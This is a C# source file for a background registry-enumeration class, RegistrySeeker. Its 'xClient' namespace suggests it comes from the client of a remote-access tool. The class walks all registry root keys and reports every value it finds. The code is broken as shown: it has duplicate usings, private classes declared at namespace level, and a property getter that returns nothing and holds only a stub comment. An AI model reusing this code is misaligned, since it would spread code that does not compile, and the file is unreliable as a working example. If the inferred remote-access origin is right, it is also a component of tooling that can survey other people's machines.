using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Security;
using Microsoft.Win32;
using System.Threading;
using xClient.Enums;
using xClient.Core.Extensions;

namespace xClient.Core.Registry
{
    private class RegSearchMatch
    {
        public RegistryKey[] RootKeys { get; set; }

        public string Key { get; private set; }
        public string Value { get; private set; }
        public string Data { get; private set; }

        public RegSearchMatch(params RegistryKey[] rootKeys)
        {
            RootKeys = rootKeys;
        }

        public RegSearchMatch(string key, string value, string data)
        {
            Key = key;
            Value = value;
            Data = data;
        }

        public override string ToString()
        {
            return String.Format("({0}:{1}:{2})", Key, Value, Data);
        }
    }

    class MatchFoundEventArgs : EventArgs
    {
        public RegSearchMatch Match { get; private set; }

        public MatchFoundEventArgs(RegSearchMatch match)
        {
            Match = match;
        }
    }

    private class SearchCompletedEventArgs : EventArgs
    {
        public List<RegSearchMatch> Matches { get; private set; }

        public SearchCompletedEventArgs(List<RegSearchMatch> matches)
        {
            Matches = matches;
        }

        public RegistryKey GetKeys
        {
            get
            {
                if (Matches == null || Matches.Count < 1)
                {
                    return null;
                }
                else
                {
                    List<RegistryKey> registryKeys = new List<RegistryKey>();
                    foreach (RegSearchMatch match in Matches)
                    {
                        try
                        {
                            // Gather the registry keys.
                        }
                        catch
                        { }
                    }
                }
            }
        }
    }

    public class RegistrySeeker
    {
        #region CONSTANTS

        /// <summary>
        /// An array containing all of the root keys for the registry.
        /// </summary>
        public static readonly RegistryKey[] ROOT_KEYS = new RegistryKey[]
        {
            Microsoft.Win32.Registry.ClassesRoot,
            Microsoft.Win32.Registry.CurrentUser,
            Microsoft.Win32.Registry.LocalMachine,
            Microsoft.Win32.Registry.Users,
            Microsoft.Win32.Registry.CurrentConfig
        };

        #endregion

        #region Fields

        /// <summary>
        /// Fired when the RegistrySeeker has finished searching through the registry.
        /// </summary>
        public event EventHandler<SearchCompletedEventArgs> SearchComplete;

        /// <summary>
        /// Fired when a RegistryKey is found.
        /// </summary>
        public event EventHandler<MatchFoundEventArgs> MatchFound;

        /// <summary>
        /// The worker thread that does the searching/traversal through the registry.
        /// </summary>
        private BackgroundWorker searcher;

        /// <summary>
        /// The lock used to ensure thread safety.
        /// </summary>
        private readonly object locker = new object();

        /// <summary>
        /// The search arguments to use for customizable registry searching.
        /// </summary>
        public RegSearchMatch searchArgs;

        private List<RegSearchMatch> matches;

        /// <summary>
        /// The queue of registry key paths to analyze further.
        /// </summary>
        private Queue<string> pendingKeys;

        #endregion

        public RegistrySeeker()
        {
            searcher = new BackgroundWorker() { WorkerSupportsCancellation = true, WorkerReportsProgress = true };

            searcher.DoWork += new DoWorkEventHandler(worker_DoWork);
            searcher.RunWorkerCompleted += new RunWorkerCompletedEventHandler(worker_RunWorkerCompleted);
            searcher.ProgressChanged += new ProgressChangedEventHandler(worker_ProgressChanged);
        }

        public void Start(RegSearchMatch args)
        {
            searchArgs = args;

            matches = new List<RegSearchMatch>();
            searcher.RunWorkerAsync();
        }

        void worker_ProgressChanged(object sender, ProgressChangedEventArgs e)
        {
            MatchFound(this, new MatchFoundEventArgs((RegSearchMatch)e.UserState));
        }

        public void Stop()
        {
            if (searcher.IsBusy)
            {
                lock (locker)
                {
                    searcher.CancelAsync();
                    // Wait until it is done... Similar to synchronous stop.
                    Monitor.Wait(locker);
                }
            }
        }

        void worker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            SearchComplete(this, new SearchCompletedEventArgs(matches));
        }

        void worker_DoWork(object sender, DoWorkEventArgs e)
        {
            foreach (RegistryKey key in searchArgs.RootKeys)
                Search(key);
        }

        void Search(RegistryKey rootKey)
        {
            string rootKeyName = rootKey.Name.Substring(rootKey.Name.LastIndexOf('\\') + 1);
            ProcessKey(rootKey, rootKeyName);

            RegistryKey subKey = null;
            string keyName;
            string parentPath;
            int cropIndex = rootKey.Name.Length + 1;
            pendingKeys = new Queue<string>(rootKey.GetSubKeyNames());

            while (pendingKeys.Count > 0)
            {
                if (searcher.CancellationPending)
                {
                    lock (locker)
                    {
                        // Allow for a synchronous stop.
                        Monitor.Pulse(locker);
                        return;
                    }
                }

                keyName = pendingKeys.Dequeue();

                try
                {
                    subKey = rootKey.OpenSubKey(keyName);
                }
                catch (SecurityException)
                {
                    subKey = null;
                }
                finally
                {
                    if (subKey != null)
                    {
                        ProcessKey(subKey, keyName);
                        parentPath = subKey.Name.Substring(cropIndex) + '\\';
                        EnqueueSubKeys(subKey, parentPath);
                    }
                }
            }
        }

        private void EnqueueSubKeys(RegistryKey key, string parentPath)
        {
            foreach (string name in key.GetSubKeyNames())
                pendingKeys.Enqueue(string.Concat(parentPath, name));
        }

        private void ProcessKey(RegistryKey key, string keyName)
        {
            foreach (string valueName in key.GetValueNames())
            {
                if (searcher.CancellationPending)
                    return;

                MatchData(key, valueName);
            }
        }

        private void MatchData(RegistryKey key, string valueName)
        {
            string valueData = key.GetValueKind(valueName).RegistryTypeToString(key.GetValue(valueName, string.Empty));

            AddMatch(key.Name, valueName, valueData);
        }

        private void AddMatch(string key, string value, string data)
        {
            RegSearchMatch match = new RegSearchMatch(key, value, data);

            if (MatchFound != null)
                searcher.ReportProgress(0, match);
            else if (SearchComplete != null)
                matches.Add(match);
        }
        
        public bool IsBusy
        {
            get { return searcher.IsBusy; }
        }
    }
}